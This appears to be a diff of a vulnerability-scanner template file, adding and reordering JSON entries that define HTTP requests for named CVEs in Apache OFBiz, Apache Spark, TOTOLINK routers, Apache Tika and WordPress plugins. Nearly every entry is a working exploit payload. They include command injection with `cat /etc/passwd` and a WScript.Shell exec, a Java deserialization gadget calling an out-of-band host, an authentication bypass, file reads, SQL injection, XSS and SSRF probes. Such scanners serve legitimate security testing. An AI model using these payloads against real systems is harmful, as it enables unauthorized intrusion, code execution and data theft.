@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -10820,7 +10820,8 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/public/login.htm?type=probes",
-            "{{BaseURL}}/public/login.htm?type=requests"
+            "{{BaseURL}}/public/login.htm?type=requests",
+            "{{BaseURL}}/public/login.htm?type=treestat"
           ]
         }
       ]
@@ -11951,8 +11952,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -12427,9 +12428,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -16625,6 +16626,20 @@
       ]
     },
     {
+      "id": "CVE-2021-30128",
+      "info": {
+        "name": "Apache OFBiz <17.12.07 - Arbitrary Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://ofbiz.apache.org/service/\">\n  <soapenv:Header/>\n    <soapenv:Body>\n      <ser>\n        <map-Map>\n          <map-Entry>\n            <map-Key>\n              <cus-obj>{{generate_java_gadget(\"dns\", \"https://{{interactsh-url}}\", \"hex\")}}</cus-obj>\n            </map-Key>\n          <map-Value>\n        <std-String/>\n        </map-Value>\n        </map-Entry>\n      </map-Map>\n      </ser>\n    </soapenv:Body>\n</soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-30151",
       "info": {
         "name": "Sidekiq <=6.2.0 - Cross-Site Scripting",
@@ -18708,6 +18723,21 @@
           "raw": [
             "POST /login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nname={{username}}&pwd={{password}}\n",
             "GET /views/?v=USER&ID=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2Cmd5({{num}})%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%3B--%20- HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42887",
+      "info": {
+        "name": "TOTOLINK - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /login.htm HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /formLoginAuth.htm?authCode=1&userName=admin&goURL=&action=login HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -22645,6 +22675,21 @@
       ]
     },
     {
+      "id": "CVE-2022-33891",
+      "info": {
+        "name": "Apache Spark UI - Command Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/doAs?=`{{url_encode(\"{{command}}\")}}`"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-33901",
       "info": {
         "name": "MultiSafepay plugin for WooCommerce <= 4.13.1 - Unauthenticated Arbitrary File Read",
@@ -23428,6 +23473,20 @@
           "raw": [
             "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-45362",
+      "info": {
+        "name": "Paytm Payment Gateway Plugin <= 2.7.0 Server Side Request Forgery (SSRF)",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?paytm_action=curltest&url={{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
